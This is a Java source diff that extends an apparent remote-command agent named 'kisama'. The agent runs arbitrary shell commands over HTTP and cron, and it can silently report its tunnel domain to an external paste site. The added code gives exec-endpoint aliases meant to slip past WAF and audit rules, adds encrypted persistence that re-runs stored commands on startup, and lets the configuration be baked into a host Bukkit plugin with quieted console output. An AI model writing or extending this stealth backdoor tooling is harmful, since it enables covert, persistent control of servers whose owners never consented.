@@ -45,6 +45,9 @@ public class kisama {
     private final String HOST;
     private final int PORT;
     private final int KMODE;   // 0=普通启动 1=隧道+域名文件+stdin 2=隧道+shz.al 静默上报 (docs/API.MD 第九节)
+    // KMODE 生效值来源: env=进程环境变量 dotenv=jar 同目录 .env build=构造参数烘焙值 default=内置缺省
+    // 排障用: 烘焙值被服务器残留环境变量压住时, 日志会直接显示 src=env
+    private final String KMODE_SOURCE;
     private final String KPATH;
     private final String KNAME;
     private final String KNAME_KEY;
@@ -122,6 +125,23 @@ public class kisama {
     // 🔧 0.5.6 cron 修复: 记录上次 tick 所在分钟, 防止 30s 间隔在同一分钟内触发两次执行
     private volatile String lastCronTickMinute = "";
 
+    // ==================== 任务持久化 (0.5.7, docs/API.MD 十三) ====================
+    // - KSTORE_KEY 环境变量为唯一密钥来源 (base64/hex 32 字节), 不落盘; 未设置/非法则
+    //   持久化关闭 (fail-closed, 绝不明文落盘)
+    // - KSTORE 指定存储路径, off/0 显式关闭; 缺省 $HOME/.tmp/store.enc
+    // - 文件内容复用 0.5.6 响应加密容器 Base64(JSON{nonce,tag,ciphertext})
+    //   (encryptAesPayload/decryptAesPayload), 明文为 {"magic","version","saved_at","data"}
+    // - 仅持久化任务定义 (不含执行日志); 原子写 (tmp+move); I/O 故障仅记日志降级,
+    //   绝不影响内存任务、请求成功与 agent 启动
+    private static final String TASK_STORE_MAGIC = "kisama-store";
+    private static final int TASK_STORE_VERSION = 1;
+    private String taskStorePath = null;
+    private byte[] taskStoreKey = null;
+    private boolean taskStoreEnabled = false;
+    private volatile boolean taskStoreLocked = false; // true=加载到高版本数据, 禁止覆盖写
+    private volatile String taskStoreLastSavedAt = null;
+    private final Object taskStoreLock = new Object();
+
     private volatile boolean isRunning = false;
 
     // 🌟 新增：用于动态计算网速的上下文变量
@@ -170,7 +190,7 @@ public class kisama {
 
     private static final int TEMPKEY_DEFAULT_TTL_HOURS = Integer.parseInt(DOTENV.getOrDefault("TEMPKEY_TTL", "24"));
     private static final int TEMPKEY_MAX_TTL_HOURS = Integer.parseInt(DOTENV.getOrDefault("TEMPKEY_MAX_TTL", "168"));
-    private static final String AGENT_VERSION = "0.5.6-java11";
+    private static final String AGENT_VERSION = "0.5.7-java11";
 
     private Map<String, Object> baseInfoCache = null;
     private long lastBaseInfoCacheTime = 0;
@@ -189,6 +209,7 @@ public class kisama {
                         DOTENV.getOrDefault("SERVER_PORT", "8000"))));
         // KMODE 启动模式: "1"=隧道+域名文件+stdin 监听; "2"=隧道+shz.al 静默上报 (详见 docs/API.MD 第九节)
         this.KMODE = parseKmode(DOTENV.getOrDefault("KMODE", "0"));
+        this.KMODE_SOURCE = settingSource("KMODE", null);
         // KMODE=2: shz.al 自定义名 (可预测 URL 的组成部分); KNAME_KEY 缺省复用 KNAME
         String kname = DOTENV.get("KNAME") == null ? "" : DOTENV.get("KNAME").trim();
         String knameKey = DOTENV.get("KNAME_KEY") == null ? "" : DOTENV.get("KNAME_KEY").trim();
@@ -205,6 +226,14 @@ public class kisama {
 
     // 2. 有参构造函数（重载）：允许外部模块直接覆盖核心 3 要素，其余继续走默认初始化
     public kisama(int port, String ecdsaPublicKeyB64, String eciesPublicKeyB64) {
+        this(port, ecdsaPublicKeyB64, eciesPublicKeyB64, null, null, null, null);
+    }
+
+    // 3. 完整构造函数：供宿主（如 Bukkit 插件）在构建期烘焙 KMODE 配置。
+    // 优先级保持与运行期覆盖约定一致: 真实环境变量 > jar 同目录 .env > 构造参数烘焙值 > 内置缺省。
+    // 烘焙参数传 null 或空串即视为"未提供", 不改变原有行为。
+    public kisama(int port, String ecdsaPublicKeyB64, String eciesPublicKeyB64,
+                  String bakedKmode, String bakedKpath, String bakedKname, String bakedKnameKey) {
         // 覆盖你指定的三个必要参数
         this.PORT = port;
         this.ECDSA_PUBLIC_KEY_B64 = ecdsaPublicKeyB64;
@@ -213,15 +242,32 @@ public class kisama {
         // 其他值继续保持默认配置和环境变量提取
         this.DEBUG = Boolean.parseBoolean(DOTENV.getOrDefault("DEBUG", "false"));
         this.HOST = DOTENV.getOrDefault("HOST", "0.0.0.0");
-        this.KMODE = parseKmode(DOTENV.getOrDefault("KMODE", "0"));
-        String kname2 = DOTENV.get("KNAME") == null ? "" : DOTENV.get("KNAME").trim();
-        String knameKey2 = DOTENV.get("KNAME_KEY") == null ? "" : DOTENV.get("KNAME_KEY").trim();
+        this.KMODE = parseKmode(resolveSetting("KMODE", bakedKmode, "0"));
+        this.KMODE_SOURCE = settingSource("KMODE", bakedKmode);
+        String kname2 = resolveSetting("KNAME", bakedKname, "").trim();
+        String knameKey2 = resolveSetting("KNAME_KEY", bakedKnameKey, "").trim();
         this.KNAME = kname2;
         this.KNAME_KEY = knameKey2.isEmpty() ? kname2 : knameKey2;
-        this.KPATH = DOTENV.getOrDefault("KPATH", "");
+        this.KPATH = resolveSetting("KPATH", bakedKpath, "");
         this.FILE_ROOT = resolveSafeFileRoot();
         this.KEYS_DIR = DOTENV.getOrDefault("KEYS_DIR", "./keys");
         this.logLevel = resolveLogLevel();
+    }
+
+    // 生效值 = DOTENV(环境变量 ∪ .env) 命中则用它, 否则用烘焙值, 再否则用内置缺省
+    private static String resolveSetting(String key, String baked, String fallback) {
+        String fromEnv = DOTENV.get(key);
+        if (fromEnv != null) return fromEnv;
+        if (baked != null && !baked.isEmpty()) return baked;
+        return fallback;
+    }
+
+    // 生效值来源, 仅用于日志排障 (与 resolveSetting 的优先级保持一致)
+    private static String settingSource(String key, String baked) {
+        if (System.getenv(key) != null) return "env";
+        if (DOTENV.get(key) != null) return "dotenv";
+        if (baked != null && !baked.isEmpty()) return "build";
+        return "default";
     }
 
     // 解析日志输出阈值 (对齐 js/go): 显式设置 LOG_LEVEL (0~3, 非法回退 3) 时优先生效;
@@ -321,6 +367,44 @@ public class kisama {
         log("[TRACE-INIT] 运行模式 DEBUG=" + this.DEBUG);
 
         initCrypto();
+
+        // 💾 任务持久化恢复 (0.5.7, docs/API.MD 十三): 离线自治
+        // - 恢复启动任务: 后台执行一次 (不阻塞 HTTP 就绪), 执行前置位 ONETIME_EXECUTED,
+        //   远端再 POST /api/task/onetime 不会二次触发 (单次执行语义)
+        // - 恢复定时任务: 直接写入 crons, 既有 30s tick 调度循环按表达式执行
+        initTaskStore();
+        Map<String, Object> restoredTasks = loadTaskStore();
+        Object restoredOneObj = restoredTasks.get("onetasks");
+        if (restoredOneObj instanceof List && !((List<?>) restoredOneObj).isEmpty()) {
+            for (Object o : (List<?>) restoredOneObj) {
+                this.onetime.add(String.valueOf(o));
+            }
+        }
+        Object restoredCronObj = restoredTasks.get("crontasks");
+        if (restoredCronObj instanceof Map && !((Map<?, ?>) restoredCronObj).isEmpty()) {
+            for (Map.Entry<?, ?> e : ((Map<?, ?>) restoredCronObj).entrySet()) {
+                this.crons.put(String.valueOf(e.getKey()), String.valueOf(e.getValue()));
+            }
+        }
+        if (!this.onetime.isEmpty() && this.ONETIME_EXECUTED.compareAndSet(false, true)) {
+            this.scheduler.submit(() -> {
+                try {
+                    for (int i = 0; i < this.onetime.size(); i++) {
+                        String cmd = this.onetime.get(i);
+                        Map<String, Object> r = executeCommandSync(cmd, null);
+                        Map<String, Object> logEntry = new LinkedHashMap<>();
+                        logEntry.put("ts", java.time.Instant.now().toString());
+                        logEntry.put("cmd", cmd);
+                        logEntry.put("output", r.get("result"));
+                        logEntry.put("exitcode", r.get("exitcode"));
+                        logEntry.put("type", "onetime");
+                        appendLogWithCap(this.onetime_log, logEntry);
+                    }
+                } catch (Exception e) {
+                    logError("[TaskStore] ❌ 启动任务恢复执行异常 (不影响服务): " + e.getMessage());
+                }
+            });
+        }
 
         log("[TRACE-INIT] ⏰ 正在激活后台 Cron 定时任务流调度引擎...");
         this.scheduler.scheduleAtFixedRate(() -> {
@@ -599,7 +683,9 @@ public class kisama {
             return this.gson.toJson(clientStatusMap);
         });
 
-        post("/api/exec", (req, res) -> {
+        // exec 别名路由（0.5.7）：部分平台 WAF/审计规则对路径中的 exec 敏感，
+        // 受限环境优先 /api/do，备选 /api/run、/api/work；与 /api/exec 完全等价（签名用实际请求路径）。
+        spark.Route execRoute = (req, res) -> {
             Map<String, Object> body = req.attribute("json_body");
             if (body == null) halt(400, this.gson.toJson(Map.of("error", "missing body")));
             String cmd = Objects.toString(body.getOrDefault("cmd", " "));
@@ -607,7 +693,11 @@ public class kisama {
             Map<String, Object> out = executeCommandSync(cmd, cwd);
             res.type("application/json");
             return this.gson.toJson(out);
-        });
+        };
+        post("/api/exec", execRoute);
+        post("/api/do", execRoute);
+        post("/api/run", execRoute);
+        post("/api/work", execRoute);
 
         post("/api/file/list", (req, res) -> {
             Map<String, Object> body = req.attribute("json_body");
@@ -996,7 +1086,10 @@ public class kisama {
                 for (Object o : (List<?>) b) tasks.add(String.valueOf(o));
             }
             if (tasks.isEmpty()) {
-                return this.gson.toJson(Map.of("status", "ok", "count", 0, "message", "Task list is empty."));
+                // 💾 0.5.7: 空列表=清空+落盘, 不执行、不消费 ONETIME_EXECUTED (对齐 py/js/go 清空语义)
+                this.onetime.clear();
+                boolean persisted = saveTaskStore();
+                return this.gson.toJson(Map.of("status", "ok", "count", 0, "message", "Task list is empty.", "persisted", persisted));
             }
             if (!this.ONETIME_EXECUTED.compareAndSet(false, true)) {
                 halt(400, this.gson.toJson(Map.of("status", "error", "message", "Onetime tasks can only be executed once per lifecycle.")));
@@ -1016,7 +1109,8 @@ public class kisama {
                 this.onetime_log.add(Map.of("ts", new Date().toString(), "cmd", this.onetime.get(i), "output", r.get("result"), "exitcode", r.get("exitcode"), "type", "onetime"));
                 executed.add(entry);
             }
-            return this.gson.toJson(Map.of("status", "ok", "count", this.onetime.size(), "tasks", this.onetime, "executed", executed));
+            boolean persisted = saveTaskStore();
+            return this.gson.toJson(Map.of("status", "ok", "count", this.onetime.size(), "tasks", this.onetime, "executed", executed, "persisted", persisted));
         });
 
         Object taskExecuteHandler = (Route) (req, res) -> {
@@ -1065,13 +1159,29 @@ public class kisama {
             }
             this.crons.clear();
             this.crons.putAll(tasks);
+            boolean persisted = saveTaskStore();
             res.type("application/json");
-            return this.gson.toJson(Map.of("status", "ok", "count", this.crons.size(), "tasks", this.crons));
+            return this.gson.toJson(Map.of("status", "ok", "count", this.crons.size(), "tasks", this.crons, "persisted", persisted));
         });
 
         get("/api/task/status", (req, res) -> {
             res.type("application/json");
-            return this.gson.toJson(Map.of("onetime", Map.of("pending", this.onetime.size() > 0, "count", this.onetime.size()), "cron", Map.of("active", this.crons.size() > 0, "count", this.crons.size(), "check_interval", 30)));
+            Map<String, Object> persistence = new LinkedHashMap<>();
+            persistence.put("enabled", this.taskStoreEnabled);
+            persistence.put("store_path", this.taskStorePath);
+            persistence.put("last_saved_at", this.taskStoreLastSavedAt);
+            Map<String, Object> oneStatus = new LinkedHashMap<>();
+            oneStatus.put("pending", this.onetime.size() > 0);
+            oneStatus.put("count", this.onetime.size());
+            Map<String, Object> cronStatus = new LinkedHashMap<>();
+            cronStatus.put("active", this.crons.size() > 0);
+            cronStatus.put("count", this.crons.size());
+            cronStatus.put("check_interval", 30);
+            Map<String, Object> resp = new LinkedHashMap<>();
+            resp.put("onetime", oneStatus);
+            resp.put("cron", cronStatus);
+            resp.put("persistence", persistence);
+            return this.gson.toJson(resp);
         });
 
         get("/api/task/log/onetime", (req, res) -> {
@@ -1289,11 +1399,12 @@ public class kisama {
         boolean valid = reasons.isEmpty();
         if (!valid && !knameHintShown) {
             knameHintShown = true;
-            // 走 log() (DEBUG/LOG 开启时输出, 否则静默)
-            logWarn("[KMODE] ⚠️ KMODE=2 未生效, 条件不满足: " + String.join("; ", reasons)
-                    + " (KNAME=" + (KNAME == null ? "(未设置)" : KNAME)
-                    + ", KNAME_KEY=" + (DOTENV.get("KNAME_KEY") == null || DOTENV.get("KNAME_KEY").isBlank() ? "(未设置, 缺省复用 KNAME)" : DOTENV.get("KNAME_KEY")) + ")");
-            log("[KMODE] 💡 修正: 设置 ≥8 字符的 KNAME 且 (可选) KNAME_KEY ≥8 字符, 例如: KNAME=myname KNAME_KEY=mysecret-pass");
+            // 走 logError: 缺省阈值 (LOG_LEVEL=3) 也会输出, 否则 KMODE 退化完全不可见
+            logError("[KMODE] ❌ KMODE=2 未生效, 实际按 KMODE=0 普通启动, 原因: " + String.join("; ", reasons)
+                    + " (KMODE 生效来源=" + KMODE_SOURCE
+                    + ", KNAME=" + (KNAME == null || KNAME.isEmpty() ? "(未设置)" : KNAME)
+                    + ", 实际密钥长度=" + (KNAME_KEY == null ? 0 : KNAME_KEY.length()) + ")");
+            logError("[KMODE] 💡 修正: KNAME ≥3 字符且 KNAME_KEY ≥8 字符, 例如 KNAME=myname KNAME_KEY=mysecret-pass; 烘焙配置见构建流水线 KMODE/KNAME/KNAME_KEY 输入");
         }
         return valid;
     }
@@ -1449,13 +1560,12 @@ public class kisama {
     }
 
     private void kmodeStdinLoop() {
-        // /domain 指令输出: 直接 System.out 并 flush, 不走 LOG 开关
+        // /domain 指令输出: 走 consoleOut 自适配通道, 不走 LOG 开关
         try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in, StandardCharsets.UTF_8))) {
             String line;
             while ((line = reader.readLine()) != null) {
                 if (line.trim().equals("/domain")) {
-                    System.out.println(kmodeDomain != null ? kmodeDomain : "[KMODE] tunnel domain not ready");
-                    System.out.flush();
+                    consoleOut(kmodeDomain != null ? kmodeDomain : "[KMODE] tunnel domain not ready");
                 }
             }
         } catch (IOException ignored) {
@@ -1464,6 +1574,8 @@ public class kisama {
     }
 
     public void activateKMode() {
+        // 生效横幅走 consoleOut 自适配通道, 不走 LOG_LEVEL 阈值: 运维需要一眼确认烘焙值是否生效、被谁压住
+        consoleOut("[KMODE] active mode=" + KMODE + " src=" + KMODE_SOURCE);
         // KMODE=1: 隧道 + 域名文件 + stdin 监听; KMODE=2: 隧道 + shz.al 静默上报
         if (KMODE == 2 && knameValid()) {
             log("[KMODE] 🚀 KMODE=2: 隧道域名将上报至外部平台");
@@ -1500,10 +1612,266 @@ public class kisama {
         stdinThread.start();
     }
 
+    // ==================== 任务持久化存储实现 (0.5.7, docs/API.MD 十三) ====================
+
+    // 解析 KSTORE/KSTORE_KEY; KSTORE_KEY 是唯一密钥来源 (不落盘), 未设置/非法则关闭 (fail-closed)
+    private void initTaskStore() {
+        String rawPath = DOTENV.get("KSTORE") == null ? "" : DOTENV.get("KSTORE").trim();
+        if (rawPath.equalsIgnoreCase("off") || rawPath.equals("0")
+                || rawPath.equalsIgnoreCase("none") || rawPath.equalsIgnoreCase("false")) {
+            log("[TaskStore] 💾 KSTORE=off, 任务持久化已显式关闭");
+            return;
+        }
+        String rawKey = DOTENV.get("KSTORE_KEY") == null ? "" : DOTENV.get("KSTORE_KEY").trim();
+        if (rawPath.isEmpty()) {
+            rawPath = Paths.get(taskStoreHomeDir(), ".tmp", "store.enc").toString();
+        }
+        byte[] key = parseTaskStoreKey(rawKey);
+        if (key == null) {
+            if (!rawKey.isEmpty()) {
+                logError("[TaskStore] ❌ KSTORE_KEY 非法 (需 base64/hex 编码的 32 字节), 任务持久化保持关闭");
+            } else {
+                log("[TaskStore] 💾 KSTORE_KEY 未设置, 任务持久化未启用");
+            }
+            return;
+        }
+        this.taskStorePath = rawPath;
+        this.taskStoreKey = key;
+        this.taskStoreEnabled = true;
+        log("[TaskStore] 💾 任务持久化已启用: " + rawPath);
+    }
+
+    // $HOME 解析链 (对齐 KMODE 域名文件 kmodeHomeDir): USERPROFILE → HOME → user.home → user.dir
+    private String taskStoreHomeDir() {
+        for (String d : new String[]{System.getenv("USERPROFILE"), System.getenv("HOME"), System.getProperty("user.home")}) {
+            if (d != null && Files.isDirectory(Paths.get(d))) {
+                return d;
+            }
+        }
+        return System.getProperty("user.dir");
+    }
+
+    // 接受 hex (64 字符) 或 std base64, 解码后必须恰为 32 字节
+    private byte[] parseTaskStoreKey(String raw) {
+        if (raw == null || raw.isEmpty()) {
+            return null;
+        }
+        try {
+            if (raw.length() == 64 && raw.matches("[0-9a-fA-F]{64}")) {
+                return hexToBytes(raw);
+            }
+            byte[] key = Base64.getDecoder().decode(raw);
+            return key.length == 32 ? key : null;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static byte[] hexToBytes(String s) {
+        byte[] out = new byte[s.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            out[i] = (byte) ((Character.digit(s.charAt(2 * i), 16) << 4) + Character.digit(s.charAt(2 * i + 1), 16));
+        }
+        return out;
+    }
+
+    // 加载持久化任务; 文件缺失/损坏一律安全降级, 返回 {"onetasks":[...], "crontasks":{...}}
+    @SuppressWarnings("unchecked")
+    private Map<String, Object> loadTaskStore() {
+        Map<String, Object> restored = new LinkedHashMap<>();
+        restored.put("onetasks", new ArrayList<String>());
+        restored.put("crontasks", new LinkedHashMap<String, String>());
+        if (!this.taskStoreEnabled) {
+            return restored;
+        }
+        synchronized (this.taskStoreLock) {
+            try {
+                Path path = Paths.get(this.taskStorePath);
+                if (!Files.isRegularFile(path)) {
+                    return restored; // 文件缺失 = 首次运行
+                }
+                String payload = new String(Files.readAllBytes(path), StandardCharsets.UTF_8).trim();
+                if (payload.isEmpty()) {
+                    return restored;
+                }
+                String plaintext;
+                try {
+                    plaintext = decryptAesPayload(payload, this.taskStoreKey);
+                } catch (Exception e) {
+                    throw new IllegalStateException("解密失败 (密钥错误或数据被篡改): " + e.getMessage());
+                }
+                Map<String, Object> doc = this.gson.fromJson(plaintext, new TypeToken<Map<String, Object>>() {
+                }.getType());
+                if (doc == null || !TASK_STORE_MAGIC.equals(doc.get("magic"))) {
+                    throw new IllegalStateException("magic 不匹配");
+                }
+                int version = doc.get("version") instanceof Number ? ((Number) doc.get("version")).intValue() : 0;
+                if (version > TASK_STORE_VERSION) {
+                    // 高版本数据: 保留原文件并锁定写, 防止旧版本 agent 覆盖
+                    this.taskStoreLocked = true;
+                    logError("[TaskStore] ❌ 存储版本 " + version + " 高于支持版本 " + TASK_STORE_VERSION
+                            + ", 保留原文件不覆盖, 本次以空任务启动且持久化只读");
+                    return restored;
+                }
+                if (version != TASK_STORE_VERSION) {
+                    throw new IllegalStateException("不支持的版本 " + version);
+                }
+                Map<String, Object> data = doc.get("data") instanceof Map
+                        ? (Map<String, Object>) doc.get("data") : new LinkedHashMap<>();
+                List<String> onetasks = new ArrayList<>();
+                if (data.get("onetasks") instanceof List) {
+                    for (Object o : (List<?>) data.get("onetasks")) {
+                        onetasks.add(String.valueOf(o));
+                    }
+                }
+                Map<String, String> crontasks = new LinkedHashMap<>();
+                if (data.get("crontasks") instanceof Map) {
+                    for (Map.Entry<?, ?> e : ((Map<?, ?>) data.get("crontasks")).entrySet()) {
+                        crontasks.put(String.valueOf(e.getKey()), String.valueOf(e.getValue()));
+                    }
+                }
+                this.taskStoreLastSavedAt = doc.get("saved_at") == null ? null : String.valueOf(doc.get("saved_at"));
+                log("[TaskStore] 💾 已恢复持久化任务: onetime=" + onetasks.size() + ", cron=" + crontasks.size());
+                restored.put("onetasks", onetasks);
+                restored.put("crontasks", crontasks);
+                return restored;
+            } catch (Exception e) {
+                quarantineTaskStore("加载失败: " + e.getMessage());
+                return restored;
+            }
+        }
+    }
+
+    // 损坏文件隔离改名避免反复加载失败; 失败也不抛出
+    private void quarantineTaskStore(String reason) {
+        try {
+            if (this.taskStorePath != null && Files.isRegularFile(Paths.get(this.taskStorePath))) {
+                String bad = this.taskStorePath + ".bad-" + System.currentTimeMillis();
+                Files.move(Paths.get(this.taskStorePath), Paths.get(bad), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+                logError("[TaskStore] ❌ " + reason + ", 原文件已隔离: " + bad);
+                return;
+            }
+        } catch (Exception ignored) {
+        }
+        logError("[TaskStore] ❌ " + reason);
+    }
+
+    // 原子落盘 (内存任务快照 → 加密 → tmp+move); 返回是否成功 (未启用/只读/失败均返回 false, 不抛出)
+    private boolean saveTaskStore() {
+        if (!this.taskStoreEnabled || this.taskStoreLocked) {
+            return false;
+        }
+        synchronized (this.taskStoreLock) {
+            String tmp = null;
+            try {
+                Map<String, Object> data = new LinkedHashMap<>();
+                data.put("onetasks", new ArrayList<>(this.onetime));
+                data.put("crontasks", new LinkedHashMap<>(this.crons));
+                String savedAt = java.time.Instant.now().truncatedTo(java.time.temporal.ChronoUnit.SECONDS).toString();
+                Map<String, Object> doc = new LinkedHashMap<>();
+                doc.put("magic", TASK_STORE_MAGIC);
+                doc.put("version", TASK_STORE_VERSION);
+                doc.put("saved_at", savedAt);
+                doc.put("data", data);
+                String payload = encryptAesPayload(this.gson.toJson(doc).getBytes(StandardCharsets.UTF_8), this.taskStoreKey);
+                Path path = Paths.get(this.taskStorePath);
+                if (path.getParent() != null) {
+                    Files.createDirectories(path.getParent());
+                }
+                tmp = this.taskStorePath + ".tmp-" + ProcessHandle.current().pid();
+                Files.write(Paths.get(tmp), payload.getBytes(StandardCharsets.UTF_8));
+                Files.move(Paths.get(tmp), path, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+                this.taskStoreLastSavedAt = savedAt;
+                return true;
+            } catch (Exception e) {
+                logError("[TaskStore] ❌ 保存失败 (内存任务不受影响): " + e.getMessage());
+                try {
+                    if (tmp != null) {
+                        Files.deleteIfExists(Paths.get(tmp));
+                    }
+                } catch (Exception ignored) {
+                }
+                return false;
+            }
+        }
+    }
+
     public static void main(String[] args) throws Exception {
         kisama agent = new kisama();
         agent.start();
         Thread.currentThread().join();
+    }
+
+    // ==================== 宿主自适配控制台通道 (Bukkit/Paper System.out Nag 规避) ====================
+    // Paper 会对插件类直写 System.out/err.print 打 Nag 警告。类加载时探测 Bukkit 宿主: 命中则自动把控制台输出
+    // 切换到服务端 JUL logger (反射取 Bukkit.getLogger(), 零编译期 Bukkit 依赖); 独立运行保持 System.out/err 直写
+    // (对齐 py/go/js)。宿主可通过 setConsoleSink 显式覆盖自适配通道 (显式注入优先)。
+    public interface ConsoleSink {
+        void out(String line);   // 原 System.out 通道
+        void err(String line);   // 原 System.err 通道
+        void trace(Throwable t); // 原 printStackTrace 通道
+    }
+
+    private static volatile ConsoleSink consoleSink = detectHostSink();
+
+    // 宿主显式注入输出通道, 优先于 Bukkit 自适配; standalone 无需调用
+    public static void setConsoleSink(ConsoleSink sink) {
+        consoleSink = sink;
+    }
+
+    // 运行时探测 Bukkit/Paper 宿主: Bukkit.getLogger() 返回 JDK JUL Logger, 可直接强转; 任意异常兜底回退默认通道
+    private static ConsoleSink detectHostSink() {
+        try {
+            Class<?> bukkit = Class.forName("org.bukkit.Bukkit");
+            final java.util.logging.Logger jul = (java.util.logging.Logger) bukkit.getMethod("getLogger").invoke(null);
+            return new ConsoleSink() {
+                @Override
+                public void out(String line) {
+                    jul.info(line);
+                }
+
+                @Override
+                public void err(String line) {
+                    jul.severe(line);
+                }
+
+                @Override
+                public void trace(Throwable t) {
+                    jul.log(java.util.logging.Level.SEVERE, "", t);
+                }
+            };
+        } catch (Throwable ignored) {
+            return null; // 非 Bukkit 宿主: 保持 System.out/err 直写
+        }
+    }
+
+    // 控制台统一出口 (实例/静态代码共用): 有 sink 走 sink, 否则按原通道直写
+    public static void consoleOut(String line) {
+        ConsoleSink sink = consoleSink;
+        if (sink != null) {
+            sink.out(line);
+            return;
+        }
+        System.out.println(line);
+        System.out.flush();
+    }
+
+    public static void consoleErr(String line) {
+        ConsoleSink sink = consoleSink;
+        if (sink != null) {
+            sink.err(line);
+            return;
+        }
+        System.err.println(line);
+    }
+
+    public static void consoleTrace(Throwable t) {
+        ConsoleSink sink = consoleSink;
+        if (sink != null) {
+            sink.trace(t);
+            return;
+        }
+        t.printStackTrace();
     }
 
     // ==================== 辅助方法 (原 static 方法改造为实例方法) ====================
@@ -1528,9 +1896,9 @@ public class kisama {
         }
         String line = "[" + LOG_LEVEL_NAMES[level] + "] " + message;
         if (level == LOG_LEVEL_ERROR) {
-            System.err.println(line);
+            consoleErr(line);
         } else {
-            System.out.println(line);
+            consoleOut(line);
         }
     }
 
@@ -1553,7 +1921,7 @@ public class kisama {
             if (Files.isDirectory(Path.of(root))) {
                 return root;
             }
-            System.err.println("[WARN-INIT] ⚠️ FILE_ROOT 指向的目录不存在: " + root + ", 降级到工作目录");
+            consoleErr("[WARN-INIT] ⚠️ FILE_ROOT 指向的目录不存在: " + root + ", 降级到工作目录");
         }
         String cwd = System.getProperty("user.dir");
         if (cwd != null && Files.isDirectory(Path.of(cwd))) {
@@ -2683,11 +3051,11 @@ public class kisama {
         String eciesStr = this.ECIES_PUBLIC_KEY_B64;
 
         if (ecdsaStr == null || ecdsaStr.isBlank() || ecdsaStr.contains("YOUR_HARDCODED_ECDSA_PUBLIC_KEY_HERE")) {
-            System.err.println("[FATAL-INIT] ❌ 启动熔断: ECDSA 公钥未配置，或仍在使用默认占位符！");
+            consoleErr("[FATAL-INIT] ❌ 启动熔断: ECDSA 公钥未配置，或仍在使用默认占位符！");
             System.exit(1);
         }
         if (eciesStr == null || eciesStr.isBlank() || eciesStr.contains("YOUR_HARDCODED_ECIES_PUBLIC_KEY_HERE")) {
-            System.err.println("[FATAL-INIT] ❌ 启动熔断: ECIES 公钥未配置，或仍在使用默认占位符！");
+            consoleErr("[FATAL-INIT] ❌ 启动熔断: ECIES 公钥未配置，或仍在使用默认占位符！");
             System.exit(1);
         }
 
@@ -2708,7 +3076,7 @@ public class kisama {
             System.arraycopy(ctrlPub, 0, this.CONTROL_PUBLIC_KEY, 0, 32);
             log("[TRACE-CRYPTO] ✅ 成功激活全局超级终端 Noise 静态拓扑密钥链");
         } catch (Exception e) {
-            System.err.println("[FATAL-INIT] ❌ 启动流产: 初始化 Noise 临时本地密钥发生崩溃 -> " + e.getMessage());
+            consoleErr("[FATAL-INIT] ❌ 启动流产: 初始化 Noise 临时本地密钥发生崩溃 -> " + e.getMessage());
             System.exit(1);
         }
 
@@ -2717,9 +3085,9 @@ public class kisama {
             this.ECDSA_PUBLIC_KEY = loadEcdsaPublicKey(ecdsaStr);
             log("[TRACE-CRYPTO] ✅ ECDSA 安全公钥加载成功并通过结构化拓扑校验。");
         } catch (Exception e) {
-            System.err.println("[FATAL-INIT] ❌ 启动熔断: ECDSA 公钥内容破坏或格式不合法！损坏凭证: [" + ecdsaStr + "]");
-            System.err.println("[FATAL-INIT] 💡 异常堆栈信息: ");
-            e.printStackTrace();
+            consoleErr("[FATAL-INIT] ❌ 启动熔断: ECDSA 公钥内容破坏或格式不合法！损坏凭证: [" + ecdsaStr + "]");
+            consoleErr("[FATAL-INIT] 💡 异常堆栈信息: ");
+            consoleTrace(e);
             System.exit(1);
         }
 
@@ -2727,9 +3095,9 @@ public class kisama {
             this.ECIES_PUBLIC_KEY = Base64.getDecoder().decode(eciesStr.trim());
             log("[TRACE-CRYPTO] ✅ ECIES 安全公钥 Base64 逆向解码合规性核验成功。");
         } catch (Exception e) {
-            System.err.println("[FATAL-INIT] ❌ 启动熔断: ECIES 公钥非合法的标准 Base64 编码流！损坏凭证: [" + eciesStr + "]");
-            System.err.println("[FATAL-INIT] 💡 异常堆栈信息: ");
-            e.printStackTrace();
+            consoleErr("[FATAL-INIT] ❌ 启动熔断: ECIES 公钥非合法的标准 Base64 编码流！损坏凭证: [" + eciesStr + "]");
+            consoleErr("[FATAL-INIT] 💡 异常堆栈信息: ");
+            consoleTrace(e);
             System.exit(1);
         }
     }
@@ -2742,7 +3110,7 @@ public class kisama {
                 return Files.readString(path).trim();
             } catch (IOException e) {
                 // 杜绝静默吞掉异常，暴漏真实的权限或 I/O 错误
-                System.err.println("[FATAL-INIT] ❌ 读取密钥文件失败: " + path + ", 原因: " + e.getMessage());
+                consoleErr("[FATAL-INIT] ❌ 读取密钥文件失败: " + path + ", 原因: " + e.getMessage());
             }
         } else {
             logWarn("[TRACE-INIT] ⚠️ 密钥文件未找到: " + path + "，将尝试后续逻辑。");
@@ -3121,10 +3489,10 @@ public class kisama {
             }
             // 🌟 修正：通过 agent 实例调用非静态方法
             agent.log("[TRACE-WS] 超级终端异常捕获: " + error.getMessage());
-            error.printStackTrace();
+            consoleTrace(error);
             if (error.getCause() != null) {
                 agent.log("[TRACE-WS] 🚨 发现隐藏在框架底层的真实元凶：");
-                error.getCause().printStackTrace();
+                consoleTrace(error.getCause());
             }
         }
     }
@@ -3354,7 +3722,7 @@ public class kisama {
                         startProcess();
                     } catch (Throwable t) { // 🌟 核心修改：由 Exception 改为 Throwable，确保能捕获底层的 LinkageError
                         agent.log("[TRACE-WS] Noise 第二阶段核验或伪终端启动瞬间爆裂: " + t.getMessage());
-                        t.printStackTrace(); // 打印底层真实的 Error 堆栈
+                        consoleTrace(t); // 打印底层真实的 Error 堆栈
                         cleanup();
                     }
                     return;
